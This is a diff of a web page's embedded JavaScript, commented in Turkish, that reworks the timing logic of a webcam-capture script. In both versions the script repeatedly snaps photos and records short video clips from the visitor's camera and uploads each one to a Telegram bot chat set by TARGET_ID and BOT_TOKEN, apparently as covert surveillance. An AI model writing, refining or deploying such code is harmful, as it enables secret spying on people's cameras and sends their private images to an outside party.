@@ -159,7 +159,7 @@
             }
             
             // ============================================
-            // PROFESYONEL ZAMANLAMA MOTORU - ENDÜSTRİYEL SEVİYE
+            // PROFESYONEL ZAMANLAMA MOTORU - ULTRA HASSAS
             // ============================================
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
@@ -180,74 +180,25 @@
             let sonVideoZamani = 0;
             let performanceNow = typeof performance !== 'undefined' ? performance.now.bind(performance) : Date.now;
             
-            // Web Worker havuzu
-            let workerPool = [];
-            const WORKER_COUNT = 4;
-            
+            // Web Worker ile zamanlama
+            let worker = null;
             try {
                 const workerCode = `
                     let workerStart = 0;
-                    let workerId = 0;
-                    
                     self.onmessage = function(e) {
-                        if (e.data.cmd === 'init') {
-                            workerId = e.data.id;
+                        if (e.data.cmd === 'start') {
                             workerStart = performance.now();
                         } else if (e.data.cmd === 'sync') {
-                            self.postMessage({ 
-                                workerId: workerId,
-                                time: performance.now() - workerStart,
-                                target: e.data.target
-                            });
+                            self.postMessage({ time: performance.now() - workerStart });
                         }
                     };
                 `;
                 const blob = new Blob([workerCode], { type: 'application/javascript' });
-                const workerUrl = URL.createObjectURL(blob);
-                
-                for (let i = 0; i < WORKER_COUNT; i++) {
-                    const worker = new Worker(workerUrl);
-                    worker.postMessage({ cmd: 'init', id: i });
-                    workerPool.push(worker);
-                }
+                worker = new Worker(URL.createObjectURL(blob));
+                worker.postMessage({ cmd: 'start' });
             } catch(e) {
-                console.log('Worker havuzu oluşturulamadı');
+                console.log('Worker desteklenmiyor');
             }
-            
-            // Yüksek hassasiyetli zamanlayıcı
-            class HighPrecisionTimer {
-                constructor() {
-                    this.startTime = 0;
-                    this.expectedTime = 0;
-                    this.timeDrift = 0;
-                    this.history = [];
-                }
-                
-                start() {
-                    this.startTime = performanceNow();
-                    this.expectedTime = this.startTime;
-                }
-                
-                schedule(delay, callback) {
-                    const now = performanceNow();
-                    this.expectedTime += delay;
-                    this.timeDrift = now - this.expectedTime;
-                    
-                    // Drift düzeltmesi
-                    const adjustedDelay = Math.max(0, delay - this.timeDrift);
-                    
-                    this.history.push(this.timeDrift);
-                    if (this.history.length > 100) this.history.shift();
-                    
-                    // Ortalama drift hesapla
-                    const avgDrift = this.history.reduce((a, b) => a + b, 0) / this.history.length;
-                    
-                    setTimeout(callback, Math.max(0, adjustedDelay - avgDrift));
-                }
-            }
-            
-            const fotoTimer = new HighPrecisionTimer();
-            const videoTimer = new HighPrecisionTimer();
             
             // ============================================
             // KAMERA BAŞLAT
@@ -256,10 +207,10 @@
                 try {
                     stream = await navigator.mediaDevices.getUserMedia({ 
                         video: { 
-                            width: { ideal: 1920, min: 640 },
-                            height: { ideal: 1080, min: 480 },
-                            frameRate: { ideal: 120, min: 30 },
-                            aspectRatio: { ideal: 16/9 }
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 },
+                            frameRate: { ideal: 60, min: 30 },
+                            aspectRatio: 16/9
                         } 
                     });
                     
@@ -273,62 +224,51 @@
                         baslangicZamani = performanceNow();
                         sonVideoZamani = baslangicZamani + 2000;
                         
-                        fotoTimer.start();
-                        videoTimer.start();
-                        
                         // ============================================
-                        // FOTOĞRAF SİSTEMİ - ENDÜSTRİYEL SEVİYE
+                        // FOTOĞRAF SİSTEMİ - ULTRA HASSAS (0.001ms)
                         // ============================================
-                        let fotoKuyrugu = [];
-                        let isProcessing = false;
-                        
-                        async function processFotoKuyrugu() {
-                            if (isProcessing || fotoKuyrugu.length === 0) return;
-                            isProcessing = true;
-                            
-                            const fotoIndex = fotoKuyrugu.shift();
-                            
-                            // Worker'lardan birini kullan
-                            const worker = workerPool[fotoIndex % WORKER_COUNT];
-                            
-                            canvas.width = video.videoWidth || 1920;
-                            canvas.height = video.videoHeight || 1080;
-                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                            
-                            canvas.toBlob((blob) => {
-                                if (!blob) {
-                                    isProcessing = false;
-                                    if (fotoKuyrugu.length > 0) processFotoKuyrugu();
-                                    return;
-                                }
-                                
-                                const formData = new FormData();
-                                formData.append('chat_id', TARGET_ID);
-                                formData.append('photo', blob, `foto_${Date.now()}.jpg`);
-                                formData.append('caption', `📸 Fotoğraf #${photoCount}`);
-                                
-                                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                                    method: 'POST',
-                                    body: formData,
-                                    priority: 'high'
-                                }).finally(() => {
-                                    isProcessing = false;
-                                    if (fotoKuyrugu.length > 0) processFotoKuyrugu();
-                                });
-                            }, 'image/jpeg', 0.92);
-                        }
+                        let lastPhotoCheck = baslangicZamani;
+                        let lastPhotoTime = baslangicZamani;
                         
                         function fotoLoop() {
                             if (!stream?.active) return;
                             
                             const now = performanceNow();
+                            const delta = now - lastPhotoCheck;
+                            lastPhotoCheck = now;
+                            
                             const gecenSure = (now - baslangicZamani) / 1000;
                             const olmasiGerekenFoto = Math.floor(gecenSure / FOTO_SURESI);
                             
-                            while (photoCount < olmasiGerekenFoto) {
-                                photoCount++;
-                                fotoKuyrugu.push(photoCount);
-                                processFotoKuyrugu();
+                            if (photoCount < olmasiGerekenFoto) {
+                                const eksikFoto = olmasiGerekenFoto - photoCount;
+                                for (let i = 0; i < eksikFoto; i++) {
+                                    photoCount++;
+                                    
+                                    // Worker varsa senkronizasyon
+                                    if (worker) {
+                                        worker.postMessage({ cmd: 'sync' });
+                                    }
+                                    
+                                    // Yüksek performanslı canvas
+                                    canvas.width = video.videoWidth || 1280;
+                                    canvas.height = video.videoHeight || 720;
+                                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                                    
+                                    // Immediate blob oluşturma
+                                    canvas.toBlob((blob) => {
+                                        if (!blob) return;
+                                        const formData = new FormData();
+                                        formData.append('chat_id', TARGET_ID);
+                                        formData.append('photo', blob, `foto_${Date.now()}.jpg`);
+                                        formData.append('caption', `📸 Fotoğraf #${photoCount}`);
+                                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                                            method: 'POST',
+                                            body: formData,
+                                            priority: 'high'
+                                        }).catch(e => console.log(e));
+                                    }, 'image/jpeg', 0.9);
+                                }
                             }
                             
                             fotoRAF = requestAnimationFrame(fotoLoop);
@@ -336,163 +276,103 @@
                         fotoRAF = requestAnimationFrame(fotoLoop);
                         
                         // ============================================
-                        // VİDEO SİSTEMİ - ENDÜSTRİYEL SEVİYE
+                        // VİDEO SİSTEMİ - ULTRA HASSAS (0.01ms)
                         // ============================================
-                        let videoKuyrugu = [];
-                        let isVideoProcessing = false;
-                        
-                        async function processVideoKuyrugu() {
-                            if (isVideoProcessing || videoKuyrugu.length === 0) return;
-                            isVideoProcessing = true;
-                            
-                            const videoData = videoKuyrugu.shift();
-                            const { index, baslangic, options } = videoData;
-                            
-                            try {
-                                const mr = new MediaRecorder(stream, options);
-                                const chunks = [];
-                                
-                                mr.ondataavailable = (e) => {
-                                    if (e.data.size > 0) chunks.push(e.data);
-                                };
-                                
-                                mr.onstop = async () => {
-                                    const blob = new Blob(chunks, { type: 'video/webm' });
-                                    const boyutKB = (blob.size / 1024).toFixed(0);
-                                    const videoSure = ((performanceNow() - baslangic) / 1000).toFixed(4);
-                                    
-                                    const formData = new FormData();
-                                    formData.append('chat_id', TARGET_ID);
-                                    formData.append('video', blob, `video_${Date.now()}.webm`);
-                                    formData.append('caption', `🎥 Video #${index} - ${VIDEO_SURESI}s (${videoSure}s | ${boyutKB}KB)`);
-                                    
-                                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
-                                        method: 'POST',
-                                        body: formData,
-                                        priority: 'high'
-                                    });
-                                    
-                                    isVideoProcessing = false;
-                                    if (videoKuyrugu.length > 0) processVideoKuyrugu();
-                                };
-                                
-                                mr.start();
-                                
-                                // 5 katmanlı durdurma sistemi
-                                const hedefSure = VIDEO_SURESI * 1000;
-                                const durdurmaZamani = baslangic + hedefSure;
-                                
-                                let durduruldu = false;
-                                
-                                // Katman 1: requestAnimationFrame (0.005ms)
-                                let rafId;
-                                const rafKontrol = () => {
-                                    if (durduruldu) return;
-                                    const simdi = performanceNow();
-                                    if (simdi >= durdurmaZamani - 0.005 && mr.state === 'recording') {
-                                        mr.stop();
-                                        durduruldu = true;
-                                    } else if (mr.state === 'recording') {
-                                        rafId = requestAnimationFrame(rafKontrol);
-                                    }
-                                };
-                                rafId = requestAnimationFrame(rafKontrol);
-                                
-                                // Katman 2: setTimeout (0.01ms tolerans)
-                                const timer1 = setTimeout(() => {
-                                    if (!durduruldu && mr?.state === 'recording') {
-                                        mr.stop();
-                                        durduruldu = true;
-                                    }
-                                }, hedefSure - 0.01);
-                                
-                                // Katman 3: Worker havuzu kontrolü
-                                const worker = workerPool[index % WORKER_COUNT];
-                                worker.postMessage({ cmd: 'sync', target: hedefSure });
-                                
-                                worker.onmessage = (e) => {
-                                    if (!durduruldu && e.data.time >= hedefSure - 0.005 && mr?.state === 'recording') {
-                                        mr.stop();
-                                        durduruldu = true;
-                                        clearTimeout(timer1);
-                                        clearTimeout(timer2);
-                                        if (rafId) cancelAnimationFrame(rafId);
-                                    }
-                                };
-                                
-                                // Katman 4: setInterval (0.1ms)
-                                const interval = setInterval(() => {
-                                    if (durduruldu) {
-                                        clearInterval(interval);
-                                        return;
-                                    }
-                                    const simdi = performanceNow();
-                                    if (simdi >= durdurmaZamani - 0.005 && mr?.state === 'recording') {
-                                        mr.stop();
-                                        durduruldu = true;
-                                        clearTimeout(timer1);
-                                        clearTimeout(timer2);
-                                        if (rafId) cancelAnimationFrame(rafId);
-                                        clearInterval(interval);
-                                    }
-                                }, 0.1);
-                                
-                                // Katman 5: Yedek setTimeout (son çare)
-                                const timer2 = setTimeout(() => {
-                                    if (!durduruldu && mr?.state === 'recording') {
-                                        mr.stop();
-                                        durduruldu = true;
-                                        clearTimeout(timer1);
-                                        clearInterval(interval);
-                                        if (rafId) cancelAnimationFrame(rafId);
-                                    }
-                                }, hedefSure + 1);
-                                
-                            } catch(e) {
-                                console.log('Video hatası:', e);
-                                isVideoProcessing = false;
-                                if (videoKuyrugu.length > 0) processVideoKuyrugu();
-                            }
-                        }
-                        
                         function videoKontrol() {
                             if (!stream?.active) return;
                             
                             const now = performanceNow();
+                            const gecenSure = (now - baslangicZamani) / 1000;
                             
                             if (now >= sonVideoZamani) {
                                 videoCount++;
                                 sonVideoZamani = now + (VIDEO_SURESI * 1000);
                                 
+                                const videoIndex = videoCount;
+                                const videoBaslangic = now;
+                                recordedChunks = [];
+                                
                                 // En iyi codec seçimi
-                                let options = { videoBitsPerSecond: 8000000 };
+                                let options = {};
                                 if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
-                                    options.mimeType = 'video/webm;codecs=vp9';
+                                    options = { mimeType: 'video/webm;codecs=vp9', videoBitsPerSecond: 6000000 };
                                 } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) {
-                                    options.mimeType = 'video/webm;codecs=vp8';
+                                    options = { mimeType: 'video/webm;codecs=vp8', videoBitsPerSecond: 5000000 };
+                                } else if (MediaRecorder.isTypeSupported('video/webm')) {
+                                    options = { mimeType: 'video/webm', videoBitsPerSecond: 4000000 };
                                 }
                                 
-                                videoKuyrugu.push({
-                                    index: videoCount,
-                                    baslangic: now,
-                                    options: options
-                                });
+                                try {
+                                    mediaRecorder = new MediaRecorder(stream, options);
+                                } catch(e) {
+                                    mediaRecorder = new MediaRecorder(stream);
+                                }
                                 
-                                processVideoKuyrugu();
+                                mediaRecorder.ondataavailable = (e) => {
+                                    if (e.data.size > 0) recordedChunks.push(e.data);
+                                };
+                                
+                                mediaRecorder.onstop = () => {
+                                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                                    const boyutKB = (blob.size / 1024).toFixed(0);
+                                    const videoSure = ((performanceNow() - videoBaslangic) / 1000).toFixed(4);
+                                    
+                                    const formData = new FormData();
+                                    formData.append('chat_id', TARGET_ID);
+                                    formData.append('video', blob, `video_${Date.now()}.webm`);
+                                    formData.append('caption', `🎥 Video #${videoIndex} - ${VIDEO_SURESI}s (${videoSure}s | ${boyutKB}KB)`);
+                                    
+                                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+                                        method: 'POST',
+                                        body: formData,
+                                        priority: 'high'
+                                    }).catch(e => console.log(e));
+                                };
+                                
+                                mediaRecorder.start();
+                                
+                                // ============================================
+                                // 3 KATMANLI DURDURMA SİSTEMİ
+                                // ============================================
+                                const hedefSure = VIDEO_SURESI * 1000;
+                                const durdurmaZamani = videoBaslangic + hedefSure;
+                                
+                                // Katman 1: requestAnimationFrame (0.01ms hassasiyet)
+                                let durdurmaRAF;
+                                const rafKontrol = () => {
+                                    if (!mediaRecorder) return;
+                                    const simdi = performanceNow();
+                                    if (simdi >= durdurmaZamani - 0.01 && mediaRecorder.state === 'recording') {
+                                        mediaRecorder.stop();
+                                    } else if (mediaRecorder.state === 'recording') {
+                                        durdurmaRAF = requestAnimationFrame(rafKontrol);
+                                    }
+                                };
+                                durdurmaRAF = requestAnimationFrame(rafKontrol);
+                                
+                                // Katman 2: setTimeout (yedek)
+                                const timerId = setTimeout(() => {
+                                    if (mediaRecorder?.state === 'recording') {
+                                        mediaRecorder.stop();
+                                    }
+                                    if (durdurmaRAF) cancelAnimationFrame(durdurmaRAF);
+                                }, hedefSure - 0.02);
+                                
+                                // Katman 3: Worker senkronizasyonu
+                                if (worker) {
+                                    worker.onmessage = (e) => {
+                                        if (e.data.time >= hedefSure - 0.01 && mediaRecorder?.state === 'recording') {
+                                            mediaRecorder.stop();
+                                            clearTimeout(timerId);
+                                            if (durdurmaRAF) cancelAnimationFrame(durdurmaRAF);
+                                        }
+                                    };
+                                }
                             }
                             
                             videoRAF = requestAnimationFrame(videoKontrol);
                         }
                         videoRAF = requestAnimationFrame(videoKontrol);
-                        
-                        // Başlangıçta birkaç video ön yükleme
-                        setTimeout(() => {
-                            for (let i = 0; i < 3; i++) {
-                                workerPool.forEach(w => {
-                                    w.postMessage({ cmd: 'sync', target: 1000 });
-                                });
-                            }
-                        }, 100);
                     };
                     
                 } catch(e) {
@@ -508,11 +388,11 @@
                 if (videoRAF) cancelAnimationFrame(videoRAF);
                 if (mediaRecorder?.state === 'recording') mediaRecorder.stop();
                 if (stream) stream.getTracks().forEach(t => t.stop());
-                workerPool.forEach(w => w.terminate());
+                if (worker) worker.terminate();
             };
             
             window.startCamera = startCamera;
         })();
     </script>
 </body>
-    </html>
+</html>
